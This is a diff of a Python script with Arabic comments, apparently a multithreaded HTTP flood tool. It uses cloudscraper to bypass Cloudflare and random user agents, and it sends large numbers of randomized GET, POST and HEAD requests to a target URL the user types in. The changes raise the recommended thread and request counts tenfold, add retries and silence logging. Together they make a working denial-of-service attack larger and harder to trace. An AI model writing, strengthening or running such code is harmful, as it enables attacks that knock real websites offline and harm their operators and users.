@@ -3,12 +3,11 @@ import threading
 from queue import Queue
 import random
 import time
-import logging
-import requests
 from fake_useragent import UserAgent
 
-# إعداد تسجيل الأحداث (logging)
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+# تعطيل تسجيل الأحداث (logging)
+import logging
+logging.basicConfig(level=logging.CRITICAL)
 
 # قائمة عناوين URL المستهدفة
 urls = Queue()
@@ -36,7 +35,7 @@ def send_requests():
     scraper = cloudscraper.create_scraper()  # إنشاء كائن Scraper
     while not urls.empty():
         url = urls.get()
-        for attempt in range(3):  # إعادة المحاولة 3 مرات في حالة الفشل
+        for attempt in range(5):  # إعادة المحاولة 5 مرات في حالة الفشل
             try:
                 headers = {
                     "User-Agent": get_random_user_agent(),
@@ -46,16 +45,15 @@ def send_requests():
                 }
                 method = random.choice(["GET", "POST", "HEAD"])
                 if method == "POST":
-                    response = scraper.post(url, data={"dummy": "data"}, headers=headers, timeout=5)
+                    # إرسال بيانات عشوائية مع طلبات POST
+                    response = scraper.post(url, data={"random_data": random.randint(1, 10000)}, headers=headers, timeout=5)
                 elif method == "HEAD":
                     response = scraper.head(url, headers=headers, timeout=5)
                 else:
                     response = scraper.get(url, headers=headers, timeout=5)
-                logging.info(f"{method} request sent to {url} | Status: {response.status_code}")
                 break  # إذا نجح الطلب، توقف عن إعادة المحاولة
-            except Exception as e:
-                logging.error(f"Error: {str(e)} | Attempt {attempt + 1} of 3 | Retrying...")
-                time.sleep(1)  # انتظر قبل إعادة المحاولة
+            except:
+                time.sleep(0.5)  # انتظر قبل إعادة المحاولة
         urls.task_done()
 
 # الإعداد الرئيسي
@@ -64,12 +62,12 @@ def main():
     الإعداد الرئيسي للاختبار.
     """
     target = input("Enter the target URL (with http/https): ").strip()
-    thread_count = int(input("Enter the number of threads (recommended: 100-1000): "))
-    request_count = int(input("Enter the total number of requests (recommended: 1000-10000): "))
+    thread_count = int(input("Enter the number of threads (recommended: 500-5000): "))
+    request_count = int(input("Enter the total number of requests (recommended: 10000-100000): "))
 
     # التحقق من صحة المدخلات
     if thread_count <= 0 or request_count <= 0:
-        logging.error("Invalid input. The number of threads and requests must be greater than 0.")
+        print("Invalid input. The number of threads and requests must be greater than 0.")
         return
 
     # ملء قائمة الطلبات
